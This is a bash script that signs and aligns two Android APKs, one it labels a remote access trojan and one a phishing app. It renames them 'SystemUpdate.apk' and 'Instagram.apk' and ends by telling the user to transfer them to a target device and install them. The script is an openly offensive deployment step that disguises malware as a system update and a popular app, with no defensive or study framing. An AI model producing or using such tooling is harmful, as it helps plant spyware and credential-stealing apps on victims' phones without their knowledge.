#!/bin/bash

echo "=================================================="
echo "   APK Signing Script"
echo "=================================================="
echo ""

# Check if keystore exists
if [ ! -f "mykey.keystore" ]; then
    echo "🔑 Generating keystore..."
    keytool -genkey -v -keystore mykey.keystore \
        -alias mykey \
        -keyalg RSA \
        -keysize 2048 \
        -validity 10000 \
        -storepass android123 \
        -keypass android123 \
        -dname "CN=Android, OU=Mobile, O=Company, L=City, S=State, C=US"
    
    if [ $? -eq 0 ]; then
        echo "✅ Keystore generated successfully!"
    else
        echo "❌ Keystore generation failed!"
        exit 1
    fi
fi

echo ""
echo "🔐 Signing RAT APK..."
echo "=================================================="

RAT_APK="AndroidRAT/app/build/outputs/apk/release/app-release-unsigned.apk"
if [ -f "$RAT_APK" ]; then
    jarsigner -verbose -sigalg SHA256withRSA -digestalg SHA-256 \
        -keystore mykey.keystore \
        -storepass android123 \
        -keypass android123 \
        "$RAT_APK" mykey
    
    zipalign -v 4 "$RAT_APK" SystemUpdate.apk
    echo "✅ RAT APK signed: SystemUpdate.apk"
else
    echo "❌ RAT APK not found! Build it first."
fi

echo ""
echo "🔐 Signing Phishing APK..."
echo "=================================================="

PHISH_APK="AndroidPhishing/app/build/outputs/apk/release/app-release-unsigned.apk"
if [ -f "$PHISH_APK" ]; then
    jarsigner -verbose -sigalg SHA256withRSA -digestalg SHA-256 \
        -keystore mykey.keystore \
        -storepass android123 \
        -keypass android123 \
        "$PHISH_APK" mykey
    
    zipalign -v 4 "$PHISH_APK" Instagram.apk
    echo "✅ Phishing APK signed: Instagram.apk"
else
    echo "❌ Phishing APK not found! Build it first."
fi

echo ""
echo "=================================================="
echo "✅ SIGNING COMPLETE!"
echo "=================================================="
echo ""
echo "📦 Signed APKs ready:"
echo "   SystemUpdate.apk (RAT)"
echo "   Instagram.apk (Phishing)"
echo ""
echo "Transfer these to target device and install."
echo ""
